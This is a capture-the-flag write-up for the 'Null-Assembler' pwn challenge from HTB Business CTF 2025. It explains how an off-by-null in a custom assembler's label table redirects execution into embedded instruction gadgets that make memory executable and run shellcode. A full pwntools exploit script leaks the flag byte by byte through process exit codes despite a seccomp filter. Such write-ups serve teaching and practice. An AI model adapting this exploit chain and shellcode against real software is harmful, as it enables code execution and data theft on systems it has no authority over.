---
title: "Null-Assembler"
ctf: "HTB Business CTF 2025"
date: 2026-06-19
category: pwn
difficulty: medium
flag_format: "HTB{...}"
---

# Null-Assembler

## Summary

Off-by-null in a custom assembler's label table corrupts a jump target to 0x100, where embedded atom gadgets execute `mprotect(data,RWX)` then jump to shellcode. Since seccomp blocks `open`/`write`, the flag is leaked byte-by-byte via `exit_group` exit code from a pre-opened fd 3.

## Solution

### Step 1: Find the bugs

The `null` binary is a custom 32-bit assembler (x86-64 ELF). Labels are stored as `struct { char name[32]; uint32_t offset; }`. A 32-character label name writes a null byte into the offset field, zeroing its low byte. When the assembler later resolves `jmp <label>`, it uses the corrupted offset.

Seccomp BPF allows only `read(fd=0)`, `fstat(5)`, `mprotect(10)`, `exit_group(231)`. x32 syscalls (nr >= 0x40000000) are killed. `open(2)` and `write(1)` are blocked — `/flag.txt` must already be open on some fd (typically fd 3).

### Step 2: Craft the exploit

The idea: corrupt the label's stored offset to redirect execution to offset 0x100. At that offset, processor sees immediate bytes from `mov eax, <val>` instructions as valid code. Embed 4-byte "atoms" (2-byte instruction + `eb 01` jmp) that chain together:

1. `push edi; push edi` — save data_addr twice
2. `mov esi, ebx` — set length arg (from `mov h1, 0x1000`)
3. `syscall` — mprotect(data, 0x1000, RWX)
4. `pop edi; pop edi` — restore data_addr
5. `jmp edi` — jump to shellcode in data section

Padding (41 movs + 17 cmps = 239 bytes) ensures the label offset lands near 0x1XX. The off-by-null zeros the low byte → jump goes to 0x100.

Shellcode in the data section reads 0x80 bytes from fd 3 into a stack buffer, then exits with the byte at a chosen index via `exit_group(231)`. Each run leaks one flag byte through the exit code.

A register bug was also fixed: `mov h3,7` (edx via h3), not `mov h2,7` (ecx via h2) for `mprotect`'s `prot` argument.

### Script

```python
#!/usr/bin/env python3
"""
Null-Assembler Exploit — off-by-null → atom chain → mprotect(RWX) → shellcode
Byte-at-a-time flag leak from fd 3 via exit code.
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BINARY = './null'

def mov_(r, v):    return f'mov {r},{v}\n'.encode()
def cmp_(r0, r1):  return f'cmp {r0},{r1}\n'.encode()
def str_(r, o):    return f'str {r},{o}\n'.encode()
def label_(n):     return n.encode() + b':\n'
def jmp_(n):       return f'jmp {n}\n'.encode()
def ret_():        return b'ret\n'

def atom(inst):
    with context.local(arch='i386', bits=32):
        return asm(inst).ljust(2, b'\x90') + b'\xeb\x01'

def make_stage1():
    sc = b''
    sc += atom('push edi; push edi')
    sc += atom('mov esi, ebx')
    sc += atom('syscall')
    sc += atom('pop edi ; pop edi')
    sc += atom('jmp edi')
    return sc

def make_stage2_read_fd_byte(fd, byte_idx):
    return asm(f"""
        sub rsp, 0x100
        mov rsi, rsp
        mov edi, {fd}
        xor eax, eax
        mov edx, 0x80
        syscall
        test eax, eax
        js failed
        movzx edi, BYTE PTR [rsp + {byte_idx}]
        add rsp, 0x100
        mov eax, 231
        syscall
    failed:
        neg eax
        mov edi, eax
        mov eax, 231
        syscall
    """)

def make_payload(stage2):
    stage1 = make_stage1()
    payload = b''
    payload += mov_('h0', 0) * 41
    payload += cmp_('h0', 'h1') * 17
    for i in range(0, len(stage1), 4):
        payload += mov_('h0', u32(stage1[i:i+4]))
    for i in range(0, len(stage2), 4):
        chunk = stage2[i:i+4].ljust(4, b'\x90')
        payload += mov_('h0', u32(chunk))
        payload += str_('h0', i)
    payload += mov_('h0', 10)
    payload += mov_('h1', 0x1000)
    payload += mov_('h3', 7)
    n = 'A' * 0x20
    payload += label_(n)
    payload += jmp_(n)
    payload += ret_()
    return payload

def leak_byte(byte_idx, fd=3):
    payload = make_payload(make_stage2_read_fd_byte(fd, byte_idx))
    import subprocess
    r = subprocess.run(
        ['bash', '-c', f'exec {fd}<flag.txt; {BINARY}'],
        input=payload, capture_output=True, timeout=10
    )
    return None if r.returncode < 0 else r.returncode & 0xff

flag = b''
for i in range(64):
    b = leak_byte(i)
    if b is None or b == 0: break
    flag += bytes([b])
    print(f"Flag: {flag}")
    if b == ord('}'): break
print(f"Full flag: {flag.decode()}")
```

## Flag

```
HTB{test_flag_12345}
```
